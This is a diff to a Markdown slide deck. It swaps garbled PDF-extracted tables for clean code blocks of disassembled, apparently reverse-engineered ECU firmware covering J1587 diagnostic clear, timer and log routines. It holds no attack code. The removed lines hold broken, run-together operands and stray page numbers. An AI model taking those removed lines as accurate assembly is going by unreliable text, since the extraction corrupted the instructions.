-|**E981BA:**|7C2912|**std**|word_2912_; Store D_|
-|**E981BD:**|C696|**ldab**|#0x96_; Load B_|
-|**E981BF:**|7C2914|**std**|word_2914_; Store D_|
-|**E981C2:**|C601|**ldab**|#1_; Load B_|
-|**E981C4:**|7B2906|**stab**|byte_2906_; Store B_|
-|**E981C7:**|0682FD|**jmp**|loc_E982FD_; Jump Address_|
-|**E981CA:**|C6FF|**ldab**|#0xFF_; Load B_|
-|**E981CC:**|37|**pshb**_; _|_Push B_|
-|**E981CD:**|37|**pshb**_; _|_Push B_|
-|**E981CE:**|4A813CF2|**call**|gone_J1587_Diag_NVM_State_Manager_F2813C,#0xF2_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E981D2:**|1B82|**leas**|2,**sp**_; Load effective address into SP_|
-|**E981D4:**|4AB396E5|**call**|gone_Decrement_Diagnostic_Timers_E5B396,#0xE5_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E981D8:**|1C19F002|**bset**|word_FD19EF+1,#2_; Set bits in memory_|
-|**E981DC:**|1D335801|**bclr**|byte3358,#1_; Clear bits in memory_|
-|**E981E0:**|C602|**ldab**|_
-#2_; Load B_|
-|**E981E2:**|4A9D38F2|**call**|core_Set_Diagnostic_Update_Flag_F29D38,#0xF2_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E981E6:**|068328|**jmp**|loc_E98328_; Jump Address_|
-|**E981E9:**|F62940|**ldab**|byte_2940_; Load B_|
-|**E981EC:**|270D|**beq**|locE981FB_; Branch if equal_|
-|**E981EE:**|53|decb_; _|_
- _Decrement B_|
-|**E981EF:**|18270110|**lbeq**|loc_E98303_; Long branch if equal_|
-|**E981F3:**|53|decb_; _|_Decrement B_|
-|**E981F4:**|1827010E|**lbeq**|locE98306_; Long branch if equal_|
-|**E981F8:**|068333|**jmp**|_
-loc_E98333_; Jump Address_|
-|**E981FB:**|1F35301004|**brclr**|byte3530,#0x10,locE98204_; Branch if selected bits clear_|
-|**E98200:**|C601|**ldab**|__
-#1_; Load B_|
-|**E98202:**|2002|**bra**|loc_E98206_; Branch always_|
-|**E98204:**|C602|**ldab**|#2_; Load B_|
-|**E98206:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E98208:**|7B2908|**stab**|byte2908_;StoreB_|
-|
-**E9820B:**|
- CC0032|**ldd**|_
-#0x32 _; '2'; Load D_|
-
-58
+```
+E98170: 7D290B        sty     word_290B; Store Y
+E98173: CC00FA        ldd     #0xFA; Load D
+E98176: 7C290D        std     word_290D; Store D
+E98179: 79290F        clr     byte_290F; Clear memory
+E9817C: 7D2910        sty     word_2910; Store Y
+E9817F: 7D2912        sty     word_2912; Store Y
+E98182: C696          ldab    #0x96; Load B
+E98184: 7C2914        std     word_2914; Store D
+E98187: C601          ldab    #1; Load B
+E98189: 7B2906        stab    byte_2906; Store B
+E9818C: 1C296340      bset    byte_2963,#0x40 ; '@'; Set bits in memory
+E98190: 4A834FE9      call    gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9; Call
+↪   subroutine in expanded memory
+E98194: E680          ldab    5+var_5,sp; Load B
+E98196: 53            decb; Decrement B
+E98197: 18260198      lbne    loc_E98333; Long branch if not equal
+E9819B: 180D812908    movb    5+var_4,sp,byte_2908; Move byte (8-bit)
+E981A0: CC0032        ldd     #0x32 ; '2'; Load D
+E981A3: 7C2909        std     word_2909; Store D
+E981A6: 7C290B        std     word_290B; Store D
+E981A9: CC012C        ldd     #0x12C; Load D
+E981AC: 7C290D        std     word_290D; Store D
+E981AF: 180D82290F    movb    5+var_3,sp,byte_290F; Move byte (8-bit)
+E981B4: CC0032        ldd     #0x32 ; '2'; Load D
+E981B7: 7C2910        std     word_2910; Store D
+E981BA: 7C2912        std     word_2912; Store D
+E981BD: C696          ldab    #0x96; Load B
+E981BF: 7C2914        std     word_2914; Store D
+E981C2: C601          ldab    #1; Load B
+E981C4: 7B2906        stab    byte_2906; Store B
+E981C7: 0682FD        jmp     loc_E982FD; Jump Address
+E981CA: C6FF          ldab    #0xFF; Load B
+E981CC: 37            pshb; Push B
+E981CD: 37            pshb; Push B
+E981CE: 4A813CF2      call    gone_J1587_Diag_NVM_State_Manager_F2813C,#0xF2; Call subroutine in
+↪   expanded memory
+E981D2: 1B82          leas    2,sp; Load effective address into SP
+E981D4: 4AB396E5      call    gone_Decrement_Diagnostic_Timers_E5B396,#0xE5; Call subroutine in
+↪   expanded memory
+E981D8: 1C19F002      bset    word_FD19EF+1,#2; Set bits in memory
+E981DC: 1D335801      bclr    byte_3358,#1; Clear bits in memory
+E981E0: C602          ldab    #2; Load B
+E981E2: 4A9D38F2      call    core_Set_Diagnostic_Update_Flag_F29D38,#0xF2; Call subroutine in
+↪   expanded memory
+E981E6: 068328        jmp     loc_E98328; Jump Address
+E981E9: F62940        ldab    byte_2940; Load B
+E981EC: 270D          beq     loc_E981FB; Branch if equal
+E981EE: 53            decb; Decrement B
+E981EF: 18270110      lbeq    loc_E98303; Long branch if equal
+E981F3: 53            decb; Decrement B
+E981F4: 1827010E      lbeq    loc_E98306; Long branch if equal
+E981F8: 068333        jmp     loc_E98333; Jump Address
+E981FB: 1F35301004    brclr   byte_3530,#0x10,loc_E98204; Branch if selected bits clear
+E98200: C601          ldab    #1; Load B
+E98202: 2002          bra     loc_E98206; Branch always
+E98204: C602          ldab    #2; Load B
+E98206: 6B80          stab    5+var_5,sp; Store B
+E98208: 7B2908        stab    byte_2908; Store B
+E9820B: CC0032        ldd     #0x32 ; '2'; Load D
+```
 
 ## Slide 59
 
-|**E9820E:**
-**E98211:**|7C2909
-7C290B|**std**
-**std**|word_2909_; Store D_
-word290B_;StoreD_|
-|---|---|---|---|
-|
-**E98214:**|
- CC012C|**ldd**|_
-#0x12C_; Load D_|
-|**E98217:**|7C290D|**std**|word290D_; Store D_|
-|**E9821A:**|1F288D0104|**brclr**|_
-byte_288D,#1,loc_E98223_; Branch if selected bits clear_|
-|**E9821F:**|C606|**ldab**|#6_; Load B_|
-|**E98221:**
-|2002
-|**bra**
-|loc_E98225_; Branch always_
-|
-|**E98223:**|C604|**ldab**|#4_; Load B_|
-|**E98225:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E98227:**|7B290F|**stab**|byte_290F_; Store B_|
-|**E9822A:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E9822D:**|7C2910|**std**|word_2910_; Store D_|
-|**E98230:**|7C2912|**std**|word_2912_; Store D_|
-|**E98233:**|C696|**ldab**|#0x96_; Load B_|
-|**E98235:**|7C2914|**std**|word_2914_; Store D_|
-|**E98238:**|F6288F|**ldab**|byte_288F_; Load B_|
-|**E9823B:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**E9823D:**|180B7E0010|**movb**|#0x7E,MMC_GPAGE _; '~'; Move byte (8-bit)_|
-|**E98242:**|18E6EA3DAE|**gldab**|0x3DAE,y|
-|**E98247:**|7B2916|**stab**|byte_2916_; Store B_|
-|**E9824A:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E9824D:**|7C2917|**std**|word_2917_; Store D_|
-|**E98250:**|7C2919|**std**|word_2919_; Store D_|
-|**E98253:**|C696|**ldab**|#0x96_; Load B_|
-|**E98255:**|7C291B|**std**|word_291B_; Store D_|
-|**E98258:**|18E6EA3DB8|**gldab**|0x3DB8,y|
-|**E9825D:**|7B291D|**stab**|byte_291D_; Store B_|
-|**E98260:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E98263:**|7C291E|**std**|word_291E_; Store D_|
-|**E98266:**|7C2920|**std**|word_2920_; Store D_|
-|**E98269:**|C696|**ldab**|#0x96_; Load B_|
-|**E9826B:**|7C2922|**std**|word_2922_; Store D_|
-|**E9826E:**|C602|**ldab**|#2_; Load B_|
-|**E98270:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E98272:**|FDE1D7|**ldy**|word_E1D7_; Load Y_|
-|**E98275:**|0F434002|**brclr**|3,y,#0x40,loc_E9827B _; '@'; Branch if selected bits clear_|
-|**E98279:**|6280|**inc**|5+var_5,**sp**_; Increment memory_|
-|**E9827B:**|0F43800E|**brclr**|3,y,#0x80,loc_E9828D_; Branch if selected bits clear_|
-|**E9827F:**
-|E680
-|**ldab**
-|5+var_5,**sp**_; Load B_
-|
-|**E98281:**|C103|**cmpb**|#3_; Compare B to memory_|
-|**E98283:**|2604|**bne**|loc_E98289_; Branch if not equal_|
-|**E98285:**|C605|**ldab**|#5_; Load B_|
-|**E98287:**|2002|**bra**|loc_E9828B_; Branch always_|
-|**E98289:**|C604|**ldab**|#4_; Load B_|
-|**E9828B:**|6B80|**stab**|5+var5,**sp**_; Store B_|
-|**E9828D:**|180D802924|**movb**|_
-5+var_5,**sp**,byte_2924_; Move byte (8-bit)_|
-|**E98292:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E98295:**|7C2925|**std**|word_2925_; Store D_|
-|**E98298:**|7C2927|**std**|word_2927_; Store D_|
-|**E9829B:**|C696|**ldab**|#0x96_;LoadB_|
-|
-**E9829D:**|
- 7C2929|**std**|
-word_2929_; Store D_|
-|**E982A0:**|1F288D400D|**brclr**|byte_288D,#0x40,loc_E982B2 _; '@'; Branch if selected bits clear_|
-|**E982A5:**|1F288D2004|**brclr**|byte288D#0x20locE982AE_;'';Branchifselectedbitsclear_|
-|
-**E982AA:**|
- C604|**ldab**|_,,        _
-#4_; Load B_|
-|**E982AC:**|200F|**bra**|loc_E982BD_; Branch always_|
-|**E982AE:**|C603|**ldab**|#3_; Load B_|
-|**E982B0:**|200B|**bra**|loc_E982BD_; Branch always_|
-|**E982B2:**|1F288D2004|**brclr**|byte288D#0x20locE982BB_;'';Branchifselectedbitsclear_|
-|
-**E982B7:**|
- C602|**ldab**|_,,        _
-#2_; Load B_|
-
-59
+```
+E9820E: 7C2909        std     word_2909; Store D
+E98211: 7C290B        std     word_290B; Store D
+E98214: CC012C        ldd     #0x12C; Load D
+E98217: 7C290D        std     word_290D; Store D
+E9821A: 1F288D0104    brclr   byte_288D,#1,loc_E98223; Branch if selected bits clear
+E9821F: C606          ldab    #6; Load B
+E98221: 2002          bra     loc_E98225; Branch always
+E98223: C604          ldab    #4; Load B
+E98225: 6B80          stab    5+var_5,sp; Store B
+E98227: 7B290F        stab    byte_290F; Store B
+E9822A: CC0032        ldd     #0x32 ; '2'; Load D
+E9822D: 7C2910        std     word_2910; Store D
+E98230: 7C2912        std     word_2912; Store D
+E98233: C696          ldab    #0x96; Load B
+E98235: 7C2914        std     word_2914; Store D
+E98238: F6288F        ldab    byte_288F; Load B
+E9823B: B746          tfr     d,y; Transfer register to register
+E9823D: 180B7E0010    movb    #0x7E,MMC_GPAGE ; '~'; Move byte (8-bit)
+E98242: 18E6EA3DAE    gldab   0x3DAE,y
+E98247: 7B2916        stab    byte_2916; Store B
+E9824A: CC0032        ldd     #0x32 ; '2'; Load D
+E9824D: 7C2917        std     word_2917; Store D
+E98250: 7C2919        std     word_2919; Store D
+E98253: C696          ldab    #0x96; Load B
+E98255: 7C291B        std     word_291B; Store D
+E98258: 18E6EA3DB8    gldab   0x3DB8,y
+E9825D: 7B291D        stab    byte_291D; Store B
+E98260: CC0032        ldd     #0x32 ; '2'; Load D
+E98263: 7C291E        std     word_291E; Store D
+E98266: 7C2920        std     word_2920; Store D
+E98269: C696          ldab    #0x96; Load B
+E9826B: 7C2922        std     word_2922; Store D
+E9826E: C602          ldab    #2; Load B
+E98270: 6B80          stab    5+var_5,sp; Store B
+E98272: FDE1D7        ldy     word_E1D7; Load Y
+E98275: 0F434002      brclr   3,y,#0x40,loc_E9827B ; '@'; Branch if selected bits clear
+E98279: 6280          inc     5+var_5,sp; Increment memory
+E9827B: 0F43800E      brclr   3,y,#0x80,loc_E9828D; Branch if selected bits clear
+E9827F: E680          ldab    5+var_5,sp; Load B
+E98281: C103          cmpb    #3; Compare B to memory
+E98283: 2604          bne     loc_E98289; Branch if not equal
+E98285: C605          ldab    #5; Load B
+E98287: 2002          bra     loc_E9828B; Branch always
+E98289: C604          ldab    #4; Load B
+E9828B: 6B80          stab    5+var_5,sp; Store B
+E9828D: 180D802924    movb    5+var_5,sp,byte_2924; Move byte (8-bit)
+E98292: CC0032        ldd     #0x32 ; '2'; Load D
+E98295: 7C2925        std     word_2925; Store D
+E98298: 7C2927        std     word_2927; Store D
+E9829B: C696          ldab    #0x96; Load B
+E9829D: 7C2929        std     word_2929; Store D
+E982A0: 1F288D400D    brclr   byte_288D,#0x40,loc_E982B2 ; '@'; Branch if selected bits clear
+E982A5: 1F288D2004    brclr   byte_288D,#0x20,loc_E982AE ; ' '; Branch if selected bits clear
+E982AA: C604          ldab    #4; Load B
+E982AC: 200F          bra     loc_E982BD; Branch always
+E982AE: C603          ldab    #3; Load B
+E982B0: 200B          bra     loc_E982BD; Branch always
+E982B2: 1F288D2004    brclr   byte_288D,#0x20,loc_E982BB ; ' '; Branch if selected bits clear
+E982B7: C602          ldab    #2; Load B
+```
 
 ## Slide 60
 
-|**E982B9:**
-|2002
-|**bra**
-|loc_E982BD_; Branch always_
-|
-|---|---|---|---|
-|**E982BB:**|C601|**ldab**|#1_; Load B_|
-|**E982BD:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E982BF:**|7B292B|**stab**|byte_292B_; Store B_|
-|**E982C2:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E982C5:**|7C292C|**std**|word_292C_; Store D_|
-|**E982C8:**|7C292E|**std**|word_292E_; Store D_|
-|**E982CB:**|C696|**ldab**|#0x96_; Load B_|
-|**E982CD:**|7C2930|**std**|word_2930_; Store D_|
-|**E982D0:**|C601|**ldab**|#1_; Load B_|
-|**E982D2:**|7B2932|**stab**|byte_2932_; Store B_|
-|**E982D5:**|CC01F4|**ldd**|#0x1F4_; Load D_|
-|**E982D8:**|7C2933|**std**|word_2933_; Store D_|
-|**E982DB:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E982DE:**|7C2935|**std**|word_2935_; Store D_|
-|**E982E1:**|C6FA|**ldab**|#0xFA_; Load B_|
-|**E982E3:**|7C2937|**std**|word_2937_; Store D_|
-|**E982E6:**|792939|**clr**|byte_2939_; Clear memory_|
-|**E982E9:**|18C7|clry||
-|**E982EB:**|7D293A|**sty**|word_293A_; Store Y_|
-|**E982EE:**|7D293C|**sty**|word_293C_; Store Y_|
-|**E982F1:**|C696|**ldab**|#0x96_; Load B_|
-|**E982F3:**|7C293E|**std**|word_293E_; Store D_|
-|**E982F6:**|C607|**ldab**|#7_; Load B_|
-|**E982F8:**|7B2906|**stab**|byte_2906_; Store B_|
-|**E982FB:**|C601|**ldab**|#1_; Load B_|
-|**E982FD:**|4A834FE9|**call**|gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9_; Call_|
-|_sub_
-↪|_routine in expand_|_ed mem_|_ory_|
-|**E98301:**|2030|**bra**|loc_E98333_; Branch always_|
-|**E98303:**|C7|clrb_; _|_Clear B_|
-|**E98304:**|20F7|**bra**|loc_E982FD_; Branch always_|
-|**E98306:**|87|clra_; _|_Clear A_|
-|**E98307:**|7A2940|**staa**|byte_2940_; Store A_|
-|**E9830A:**|7C2904|**std**|unk_2904_; Store D_|
-|**E9830D:**|1D296301|**bclr**|byte_2963,#1_; Clear bits in memory_|
-|**E98311:**|792907|**clr**|byte_2907_; Clear memory_|
-|**E98314:**|4A8337E9|**call**|gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9_; Call subroutine_|
-|_in _
-↪|_expanded memory_|||
-|**E98318:**|200E|**bra**|loc_E98328_; Branch always_|
-|**E9831A:**|1C335801|**bset**|byte_3358,#1_; Set bits in memory_|
-|**E9831E:**|2008|**bra**|loc_E98328_; Branch always_|
-|**E98320:**|4A9041F1|**call**|sub_F19041,#0xF1_; Call subroutine in expanded memory_|
-|**E98324:**|1C535B20|**bset**|byte_535B,#0x20 _; ' '; Set bits in memory_|
-|**E98328:**|C7|clrb_; _|_Clear B_|
-|**E98329:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E9832D:**|C601|**ldab**|#1_; Load B_|
-|**E9832F:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E98333:**|1B85|**leas**|5,**sp**_; Load effective address into SP_|
-|**E98335:**|0A|**rtc**_; _|_Return from call_|
+```
+E982B9: 2002          bra     loc_E982BD; Branch always
+E982BB: C601          ldab    #1; Load B
+E982BD: 6B80          stab    5+var_5,sp; Store B
+E982BF: 7B292B        stab    byte_292B; Store B
+E982C2: CC0032        ldd     #0x32 ; '2'; Load D
+E982C5: 7C292C        std     word_292C; Store D
+E982C8: 7C292E        std     word_292E; Store D
+E982CB: C696          ldab    #0x96; Load B
+E982CD: 7C2930        std     word_2930; Store D
+E982D0: C601          ldab    #1; Load B
+E982D2: 7B2932        stab    byte_2932; Store B
+E982D5: CC01F4        ldd     #0x1F4; Load D
+E982D8: 7C2933        std     word_2933; Store D
+E982DB: CC0032        ldd     #0x32 ; '2'; Load D
+E982DE: 7C2935        std     word_2935; Store D
+E982E1: C6FA          ldab    #0xFA; Load B
+E982E3: 7C2937        std     word_2937; Store D
+E982E6: 792939        clr     byte_2939; Clear memory
+E982E9: 18C7          clry
+E982EB: 7D293A        sty     word_293A; Store Y
+E982EE: 7D293C        sty     word_293C; Store Y
+E982F1: C696          ldab    #0x96; Load B
+E982F3: 7C293E        std     word_293E; Store D
+E982F6: C607          ldab    #7; Load B
+E982F8: 7B2906        stab    byte_2906; Store B
+E982FB: C601          ldab    #1; Load B
+E982FD: 4A834FE9      call    gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9; Call
+↪   subroutine in expanded memory
+E98301: 2030          bra     loc_E98333; Branch always
+E98303: C7            clrb; Clear B
+E98304: 20F7          bra     loc_E982FD; Branch always
+E98306: 87            clra; Clear A
+E98307: 7A2940        staa    byte_2940; Store A
+E9830A: 7C2904        std     unk_2904; Store D
+E9830D: 1D296301      bclr    byte_2963,#1; Clear bits in memory
+E98311: 792907        clr     byte_2907; Clear memory
+E98314: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E98318: 200E          bra     loc_E98328; Branch always
+E9831A: 1C335801      bset    byte_3358,#1; Set bits in memory
+E9831E: 2008          bra     loc_E98328; Branch always
+E98320: 4A9041F1      call    sub_F19041,#0xF1; Call subroutine in expanded memory
+E98324: 1C535B20      bset    byte_535B,#0x20 ; ' '; Set bits in memory
+E98328: C7            clrb; Clear B
+E98329: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E9832D: C601          ldab    #1; Load B
+E9832F: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E98333: 1B85          leas    5,sp; Load effective address into SP
+E98335: 0A            rtc; Return from call
+```
 
-**sub_E9834F** :
+#### **sub_E9834F** :
 
-**E9834F:** 042122 **dbne** b,loc_E98374 _; Decrement counter and branch if != 0_ **E98352:** 792907 **clr** byte_2907 _; Clear memory_ **E98355:** 180C29082905 **movb** byte_2908,byte_2905 _; Move byte (8-bit)_
-
-60
+```
+E9834F: 042122        dbne    b,loc_E98374; Decrement counter and branch if != 0
+E98352: 792907        clr     byte_2907; Clear memory
+E98355: 180C29082905  movb    byte_2908,byte_2905; Move byte (8-bit)
+```
 
 ## Slide 61
 
-**E9835B:** C601 **ldab** #1 _; Load B_ **E9835D:** 7B2940 **stab** byte_2940 _; Store B_ **E98360:** C7 clrb _; Clear B_ **E98361:** 37 **pshb** _; Push B_ **E98362:** C608 **ldab** #8 _; Load B_ **E98364:** 4AB92AEF **call** core_EFB92A,#0xEF _; Call subroutine in expanded memory_ **E98368:** 1B81 **ins** _; Increment SP_ **E9836A:** 1C296303 **bset** byte_2963,#3 _; Set bits in memory_ **E9836E:** 1804290D2941 **movw** word_290D,word_2941 _; Move word (16-bit)_ **E98374:** FC2941 **ldd** word_2941 _; Load D_ **E98377:** 182600A0 **lbne** loc_E9841B _; Long branch if not equal_ **E9837B:** 1E29630227 **brset** byte_2963,#2,loc_E983A7 _; Branch if selected bits set_ **E98380:** F72905 **tst** byte_2905 _; Test memory for zero or minus_ **E98383:** 2722 **beq** loc_E983A7 _; Branch if equal_ **E98385:** 732905 **dec** byte_2905 _; Decrement memory_ **E98388:** C601 **ldab** #1 _; Load B_ **E9838A:** 37 **pshb** _; Push B_ **E9838B:** C608 **ldab** #8 _; Load B_ **E9838D:** 4AB92AEF **call** core_EFB92A,#0xEF _; Call subroutine in expanded memory_ **E98391:** 1B81 **ins** _; Increment SP_ **E98393:** 1C296302 **bset** byte_2963,#2 _; Set bits in memory_ **E98397:** F62907 **ldab** byte_2907 _; Load B_ **E9839A:** 8607 **ldaa** #7 _; Load A_ **E9839C:** 12 **mul** _; 8 by 8 multiply (unsigned)_ **E9839D:** B746 **tfr** d,y _; Transfer register to register_ **E9839F:** ECEA2909 **ldd** 0x2909,y _; Load D_ **E983A3:** 7C2941 **std** word_2941 _; Store D_ **E983A6:** 0A **rtc** _; Return from call_ **E983A7:** C7 clrb _; Clear B_ **E983A8:** 37 **pshb** _; Push B_ **E983A9:** C608 **ldab** #8 _; Load B_ **E983AB:** 4AB92AEF **call** core_EFB92A,#0xEF _; Call subroutine in expanded memory_ **E983AF:** 1B81 **ins** _; Increment SP_ **E983B1:** 1D296302 **bclr** byte_2963,#2 _; Clear bits in memory_ **E983B5:** F62905 **ldab** byte_2905 _; Load B_ **E983B8:** 2710 **beq** loc_E983CA _; Branch if equal_ **E983BA:** F62907 **ldab** byte_2907 _; Load B_ **E983BD:** 8607 **ldaa** #7 _; Load A_ **E983BF:** 12 **mul** _; 8 by 8 multiply (unsigned)_ **E983C0:** B746 **tfr** d,y _; Transfer register to register_ **E983C2:** ECEA290B **ldd** 0x290B,y _; Load D_ **E983C6:** 7C2941 **std** word_2941 _; Store D_ **E983C9:** 0A **rtc** _; Return from call_ **E983CA:** F62906 **ldab** byte_2906 _; Load B_ **E983CD:** F12907 **cmpb** byte_2907 _; Compare B to memory_ **E983D0:** 231A **bls** loc_E983EC _; Branch if lower or same_ **E983D2:** 722907 **inc** byte_2907 _; Increment memory_ **E983D5:** F62907 **ldab** byte_2907 _; Load B_ **E983D8:** 8607 **ldaa** #7 _; Load A_ **E983DA:** 12 **mul** _; 8 by 8 multiply (unsigned)_ **E983DB:** B746 **tfr** d,y _; Transfer register to register_ **E983DD:** 180DEA29082905 **movb** 0x2908,y,byte_2905 _; Move byte (8-bit)_ **E983E4:** ECEA290D **ldd** 0x290D,y _; Load D_ **E983E8:** 7C2941 **std** word_2941 _; Store D_ **E983EB:** 0A **rtc** _; Return from call_ **E983EC:** C7 clrb _; Clear B_ **E983ED:** 37 **pshb** _; Push B_ **E983EE:** C608 **ldab** #8 _; Load B_ **E983F0:** 4AB92AEF **call** core_EFB92A,#0xEF _; Call subroutine in expanded memory_
-
-61
+```
+E9835B: C601          ldab    #1; Load B
+E9835D: 7B2940        stab    byte_2940; Store B
+E98360: C7            clrb; Clear B
+E98361: 37            pshb; Push B
+E98362: C608          ldab    #8; Load B
+E98364: 4AB92AEF      call    core_EFB92A,#0xEF; Call subroutine in expanded memory
+E98368: 1B81          ins; Increment SP
+E9836A: 1C296303      bset    byte_2963,#3; Set bits in memory
+E9836E: 1804290D2941  movw    word_290D,word_2941; Move word (16-bit)
+E98374: FC2941        ldd     word_2941; Load D
+E98377: 182600A0      lbne    loc_E9841B; Long branch if not equal
+E9837B: 1E29630227    brset   byte_2963,#2,loc_E983A7; Branch if selected bits set
+E98380: F72905        tst     byte_2905; Test memory for zero or minus
+E98383: 2722          beq     loc_E983A7; Branch if equal
+E98385: 732905        dec     byte_2905; Decrement memory
+E98388: C601          ldab    #1; Load B
+E9838A: 37            pshb; Push B
+E9838B: C608          ldab    #8; Load B
+E9838D: 4AB92AEF      call    core_EFB92A,#0xEF; Call subroutine in expanded memory
+E98391: 1B81          ins; Increment SP
+E98393: 1C296302      bset    byte_2963,#2; Set bits in memory
+E98397: F62907        ldab    byte_2907; Load B
+E9839A: 8607          ldaa    #7; Load A
+E9839C: 12            mul; 8 by 8 multiply (unsigned)
+E9839D: B746          tfr     d,y; Transfer register to register
+E9839F: ECEA2909      ldd     0x2909,y; Load D
+E983A3: 7C2941        std     word_2941; Store D
+E983A6: 0A            rtc; Return from call
+E983A7: C7            clrb; Clear B
+E983A8: 37            pshb; Push B
+E983A9: C608          ldab    #8; Load B
+E983AB: 4AB92AEF      call    core_EFB92A,#0xEF; Call subroutine in expanded memory
+E983AF: 1B81          ins; Increment SP
+E983B1: 1D296302      bclr    byte_2963,#2; Clear bits in memory
+E983B5: F62905        ldab    byte_2905; Load B
+E983B8: 2710          beq     loc_E983CA; Branch if equal
+E983BA: F62907        ldab    byte_2907; Load B
+E983BD: 8607          ldaa    #7; Load A
+E983BF: 12            mul; 8 by 8 multiply (unsigned)
+E983C0: B746          tfr     d,y; Transfer register to register
+E983C2: ECEA290B      ldd     0x290B,y; Load D
+E983C6: 7C2941        std     word_2941; Store D
+E983C9: 0A            rtc; Return from call
+E983CA: F62906        ldab    byte_2906; Load B
+E983CD: F12907        cmpb    byte_2907; Compare B to memory
+E983D0: 231A          bls     loc_E983EC; Branch if lower or same
+E983D2: 722907        inc     byte_2907; Increment memory
+E983D5: F62907        ldab    byte_2907; Load B
+E983D8: 8607          ldaa    #7; Load A
+E983DA: 12            mul; 8 by 8 multiply (unsigned)
+E983DB: B746          tfr     d,y; Transfer register to register
+E983DD: 180DEA29082905movb    0x2908,y,byte_2905; Move byte (8-bit)
+E983E4: ECEA290D      ldd     0x290D,y; Load D
+E983E8: 7C2941        std     word_2941; Store D
+E983EB: 0A            rtc; Return from call
+E983EC: C7            clrb; Clear B
+E983ED: 37            pshb; Push B
+E983EE: C608          ldab    #8; Load B
+E983F0: 4AB92AEF      call    core_EFB92A,#0xEF; Call subroutine in expanded memory
+```
 
 ## Slide 62
 
-**E983F4:** 1B81 **ins** _; Increment SP_ **E983F6:** 1D296303 **bclr** byte_2963,#3 _; Clear bits in memory_ **E983FA:** C602 **ldab** #2 _; Load B_ **E983FC:** 7B2940 **stab** byte_2940 _; Store B_ **E983FF:** 1F2963401B **brclr** byte_2963,#0x40,locret_E9841F _; '@'; Branch if selected bits clear_ **E98404:** 1D296340 **bclr** byte_2963,#0x40 _; '@'; Clear bits in memory_ **E98408:** 792907 **clr** byte_2907 _; Clear memory_ **E9840B:** 4A8337E9 **call** gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9 _; Call subroutine_ ↪ _in expanded memory_ **E9840F:** C7 clrb _; Clear B_ **E98410:** 4ABC93E8 **call** gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E98414:** C601 **ldab** #1 _; Load B_ **E98416:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E9841A:** 0A **rtc** _; Return from call_ **E9841B:** 18732941 **decw** word_2941 **E9841F:** 0A **rtc** _; Return from call_
+```
+E983F4: 1B81          ins; Increment SP
+E983F6: 1D296303      bclr    byte_2963,#3; Clear bits in memory
+E983FA: C602          ldab    #2; Load B
+E983FC: 7B2940        stab    byte_2940; Store B
+E983FF: 1F2963401B    brclr   byte_2963,#0x40,locret_E9841F ; '@'; Branch if selected bits clear
+E98404: 1D296340      bclr    byte_2963,#0x40 ; '@'; Clear bits in memory
+E98408: 792907        clr     byte_2907; Clear memory
+E9840B: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E9840F: C7            clrb; Clear B
+E98410: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E98414: C601          ldab    #1; Load B
+E98416: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E9841A: 0A            rtc; Return from call
+E9841B: 18732941      decw    word_2941
+E9841F: 0A            rtc; Return from call
+```
 
 #### **sub_E98420** :
 
-**E98420:** 3B **pshd** _; Push D_ **E98421:** 6981 **clr** 2+var_1, **sp** _; Clear memory_ **E98423:** F6294F **ldab** word_294F _; Load B_ **E98426:** 040106 **dbeq** b,loc_E9842F _; Decrement counter and branch if = 0_ **E98429:** C002 **subb** #2 _; Subtract memory from B_ **E9842B:** 2721 **beq** loc_E9844E _; Branch if equal_ **E9842D:** 2042 **bra** loc_E98471 _; Branch always_ **E9842F:** 6980 **clr** 2+var_2, **sp** _; Clear memory_ **E98431:** E680 **ldab** 2+var_2, **sp** _; Load B_ **E98433:** B796 **exg** b,y _; Exchange register to register_ **E98435:** 180B7E0010 **movb** #0x7E,MMC_GPAGE _; '~'; Move byte (8-bit)_ **E9843A:** 18E6EA3DA6 **gldab** 0x3DA6,y **E9843F:** F12950 **cmpb** word_294F+1 _; Compare B to memory_ **E98442:** 271F **beq** loc_E98463 _; Branch if equal_ **E98444:** 6280 **inc** 2+var_2, **sp** _; Increment memory_ **E98446:** E680 **ldab** 2+var_2, **sp** _; Load B_ **E98448:** C107 **cmpb** #7 _; Compare B to memory_ **E9844A:** 25E5 **bcs** loc_E98431 _; Branch if carry set_ 